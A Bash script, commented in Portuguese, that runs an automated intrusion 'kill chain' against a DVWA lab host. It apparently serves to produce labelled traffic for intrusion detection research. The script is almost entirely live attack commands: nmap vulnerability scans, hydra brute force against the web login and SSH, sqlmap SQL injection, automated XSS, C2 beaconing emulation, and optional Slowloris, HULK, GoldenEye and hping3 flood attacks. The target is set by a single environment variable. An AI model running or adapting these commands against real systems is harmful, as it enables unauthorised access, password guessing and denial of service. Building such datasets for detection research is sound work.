#!/usr/bin/env bash
# ==============================================================================
# ataque_humano.sh - Campanha Sequencial do Atacante Humano (ALF-MoE)
# ==============================================================================
# Executa a cadeia realista de intrusão (Kill Chain: Reconhecimento -> Web -> SSH -> C2)
# com intervalo de 20 minutos (1200s) entre cada etapa para rotulação limpa no NIDS.
#
# Uso:
#   ./scripts/ataque_humano.sh              # Executa a cadeia realista de invasao
#   ./scripts/ataque_humano.sh --dos-only   # Executa apenas a bateria isolada de DoS/DDoS
#   ./scripts/ataque_humano.sh --with-dos   # Executa a cadeia + testes de estresse
# ==============================================================================

set -o pipefail

# ----------------- Parametros e Flags -----------------
EXEC_CHAIN=true
EXEC_DOS=false

for arg in "$@"; do
    case "$arg" in
        --dos-only)
            EXEC_CHAIN=false
            EXEC_DOS=true
            ;;
        --with-dos)
            EXEC_CHAIN=true
            EXEC_DOS=true
            ;;
        -h|--help)
            echo "Uso: $0 [--dos-only | --with-dos]"
            echo "  (sem argumentos): Executa a Kill Chain de invasao realista (Opcao A)"
            echo "  --dos-only      : Executa apenas a bateria isolada de DoS/DDoS"
            echo "  --with-dos      : Executa a cadeia de invasao e em seguida os testes de DoS"
            exit 0
            ;;
    esac
done

# ----------------- Configuracoes do Ambiente -----------------
TARGET_IP="${TARGET_IP:-192.168.1.50}"
TARGET_PORT_WEB="${TARGET_PORT_WEB:-8080}"
DVWA_COOKIE="${DVWA_COOKIE:-xyz123abc456}"
SSH_USER="${SSH_USER:-user}"
WORDLIST_PASS="${WORDLIST_PASS:-/usr/share/wordlists/metasploit/unix_passwords.txt}"
INTERVALO_SEGUNDOS="${INTERVALO_SEGUNDOS:-1200}"  # 20 minutos de descanso entre ataques
OUTPUT_DIR="${OUTPUT_DIR:-results/human_attack_$(date +%Y%m%d_%H%M%S)}"
TIMELINE_LOG="$OUTPUT_DIR/human_attack_timeline.log"

mkdir -p "$OUTPUT_DIR"

log_event() {
    local status="$1"
    local attack_name="$2"
    local timestamp
    timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    echo "[$timestamp] [$status] $attack_name" | tee -a "$TIMELINE_LOG"
}

wait_interval() {
    local attack_name="$1"
    log_event "INTERVAL_START" "Pausa de 20 minutos apos $attack_name"
    echo "[+] Aguardando 20 minutos (${INTERVALO_SEGUNDOS}s) para recuperacao da rede e registro de baseline..."
    sleep "$INTERVALO_SEGUNDOS"
    log_event "INTERVAL_END" "Fim do intervalo de descanso"
}

run_attack() {
    local phase="$1"
    local name="$2"
    local cmd="$3"

    echo "======================================================================"
    echo "[*] Iniciando Fase: $phase | Ataque: $name"
    echo "[*] Comando: $cmd"
    echo "======================================================================"

    log_event "ATTACK_START" "$name"
    eval "$cmd"
    local exit_code=$?
    log_event "ATTACK_END" "$name (Exit Code: $exit_code)"

    echo "[*] Concluido: $name"
    wait_interval "$name"
}

# ----------------- Inicio da Campanha -----------------
echo "[+] Iniciando Campanha do Atacante Humano contra $TARGET_IP"
echo "[+] Diretorio de saida: $OUTPUT_DIR"
echo "[+] Intervalo entre ataques: ${INTERVALO_SEGUNDOS} segundos"
log_event "CAMPAIGN_START" "Alvo: $TARGET_IP (Chain: $EXEC_CHAIN, DoS: $EXEC_DOS)"

# ==============================================================================
# CADEIA REALISTA DE INTRUSAO (KILL CHAIN - OPCAO A)
# ==============================================================================
if [ "$EXEC_CHAIN" = true ]; then
    echo ">>> Iniciando Cadeia de Invasao Realista (Fases 1 a 5) <<<"

    # FASE 1: Reconhecimento e Varredura
    run_attack "1.1" "Nmap_Basico" \
      "nmap -vv --reason -oA '$OUTPUT_DIR/nmap_basico' $TARGET_IP"

    run_attack "1.2" "Nmap_Stealth_SYN" \
      "nmap -sS -T2 -sV -vv --reason -oA '$OUTPUT_DIR/nmap_stealth' $TARGET_IP"

    run_attack "1.3" "Nmap_Semi_Agressivo" \
      "nmap -p 1-65535 -A -T4 --version-all --osscan-guess -vv --reason -oA '$OUTPUT_DIR/nmap_semi_agressivo' $TARGET_IP"

    run_attack "1.4" "Nmap_Agressivo_NSE" \
      "nmap -p 1-65535 -A -T5 --version-all --osscan-guess --script='vuln,discovery,intrusive' -vv --reason -oA '$OUTPUT_DIR/nmap_agressivo' $TARGET_IP"

    # FASE 2: Exploracao Web (DVWA na porta 8080)
    run_attack "2.1" "Web_Brute_Force_Hydra" \
      "hydra -l admin -P '$WORDLIST_PASS' $TARGET_IP:$TARGET_PORT_WEB http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=$DVWA_COOKIE; security=low:F=Username and/or password incorrect.' -t 4 -f -v -o '$OUTPUT_DIR/hydra_web.txt'"

    run_attack "2.2" "Web_SQL_Injection_Sqlmap" \
      "sqlmap -u 'http://$TARGET_IP:$TARGET_PORT_WEB/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=$DVWA_COOKIE; security=low' -p id --batch --dbs"

    run_attack "2.3" "Web_XSS_XSSer" \
      "xsser -u 'http://$TARGET_IP:$TARGET_PORT_WEB/vulnerabilities/xss_r/' -g '/vulnerabilities/xss_r/?name=XSS' --cookie='PHPSESSID=$DVWA_COOKIE; security=low' --auto --auto-set=30"

    # FASE 3: Autenticacao Administrativa de Infraestrutura (SSH)
    run_attack "3.1" "SSH_Brute_Force_Hydra" \
      "hydra -l $SSH_USER -P '$WORDLIST_PASS' ssh://$TARGET_IP -t 4 -f -V -o '$OUTPUT_DIR/hydra_ssh.txt'"

    # FASE 4: Pos-Exploracao e Comando & Controle (C2)
    run_attack "4.1" "C2_Beaconing_Emulation" \
      "python3 -c \"import time, urllib.request; [urllib.request.urlopen('http://$TARGET_IP:$TARGET_PORT_WEB/dvwa/', timeout=3) or time.sleep(5) for _ in range(12)]\""
fi

# ==============================================================================
# BATERIA ISOLADA DE NEGACAO DE SERVICO (OPCIONAL / SEPARADA)
# ==============================================================================
if [ "$EXEC_DOS" = true ]; then
    echo ">>> Iniciando Bateria Isolada de Negacao de Servico (DoS / DDoS) <<<"
    echo "[!] ATENCAO: Estes testes podem derrubar os containers alvo."

    run_attack "DoS.1" "DoS_Slowloris" \
      "slowhttptest -c 1000 -H -g -o '$OUTPUT_DIR/slowloris' -i 10 -r 200 -t GET -u 'http://$TARGET_IP:$TARGET_PORT_WEB/' -x 24 -p 3 -l 60"

    run_attack "DoS.2" "DoS_GoldenEye" \
      "timeout 60s goldeneye 'http://$TARGET_IP:$TARGET_PORT_WEB/' -w 10 -s 500 -m random -n"

    run_attack "DoS.3" "DoS_Hulk" \
      "timeout 60s python3 hulk.py 'http://$TARGET_IP:$TARGET_PORT_WEB/'"

    run_attack "DoS.4" "DDoS_LOIC_HTTP_AB" \
      "ab -n 50000 -c 100 -r 'http://$TARGET_IP:$TARGET_PORT_WEB/'"

    run_attack "DoS.5" "DDoS_LOIC_UDP_Hping3" \
      "sudo timeout 60s hping3 --udp --flood -p 80 $TARGET_IP"
fi

echo "======================================================================"
echo "[+] Campanha concluida com sucesso!"
echo "[+] Log de auditoria temporal gravado em: $TIMELINE_LOG"
echo "======================================================================"
log_event "CAMPAIGN_END" "Execucao concluida"
